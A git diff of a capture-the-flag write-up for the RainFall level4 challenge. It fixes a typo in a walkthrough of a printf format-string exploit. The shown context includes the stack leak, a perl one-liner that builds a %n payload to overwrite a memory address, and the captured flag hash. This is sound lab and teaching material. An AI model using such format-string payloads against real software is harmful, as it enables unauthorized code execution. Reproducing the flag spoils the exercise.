@@ -74,7 +74,7 @@ level4@RainFall:~$ cat /tmp/level4 | ./level4
 AAAA b7ff26b0 bffff784 b7fd0ff4 00000000 00000000 bffff748 0804848d bffff540 00000200 b7fd1ac0 b7ff37d0 41414141
 ```
 
-Knowing that the 12th argument is the beginning of our buffer, we have to find a way to make `printf` write 16930116 byt1es before using the `%n` conversion. To do so, we use the field width modifier of `printf` on the last `%x` conversion, as we did previously on each one to print the stack content with an eight characters padding.
+Knowing that the 12th argument is the beginning of our buffer, we have to find a way to make `printf` write 16930116 bytes before using the `%n` conversion. To do so, we use the field width modifier of `printf` on the last `%x` conversion, as we did previously on each one to print the stack content with an eight characters padding.
 
 But before, we prepare our string without this padding to write its length to `eax` and get it with gdb.
 
@@ -98,7 +98,7 @@ Our current string length is 0x48, or 72 in decimal, we want to write the value 
 level4@RainFall:~$ perl -e 'print "\x10\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%16930052x%n"' > /tmp/level4
 level4@RainFall:~$ cat /tmp/level4 | ./level4
 ...
-[hit return, then wait for printf to write the whole string, which is very long]
+[hit return, then wait for printf to write the whole string]
 ...
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
